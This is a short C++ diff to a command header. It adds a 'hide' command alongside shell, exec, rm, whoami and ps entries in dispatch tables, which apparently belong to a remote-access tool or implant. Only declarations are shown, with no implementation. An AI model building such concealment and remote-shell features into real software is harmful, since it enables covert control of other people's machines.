@@ -30,6 +30,7 @@ void cmd_getuid();
 void cmd_getpid();
 void cmd_getgid();
 void cmd_ps();
+void cmd_hide();
 
 static std::map<std::string, std::function<void(std::vector<std::string>)>> passCmds = {
     {"rm", cmd_rm}, {"rmdir", cmd_rmdir}, {"mkdir", cmd_mkdir}, {"exec", cmd_exec},
@@ -39,7 +40,8 @@ static std::map<std::string, std::function<void(std::vector<std::string>)>> pass
 
 static std::map<std::string, std::function<void()>> nopassCmds = {
     {"shell", cmd_shell}, {"pwd", cmd_pwd}, {"whoami", cmd_whoami}, {"hostname", cmd_hostname},
-    {"getuid", cmd_getuid}, {"getpid", cmd_getpid}, {"getgid", cmd_getgid}, {"ps", cmd_ps}
+    {"getuid", cmd_getuid}, {"getpid", cmd_getpid}, {"getgid", cmd_getgid}, {"ps", cmd_ps},
+    {"hide", cmd_hide}
 };
 
 #endif // _COMMANDS_HPP_
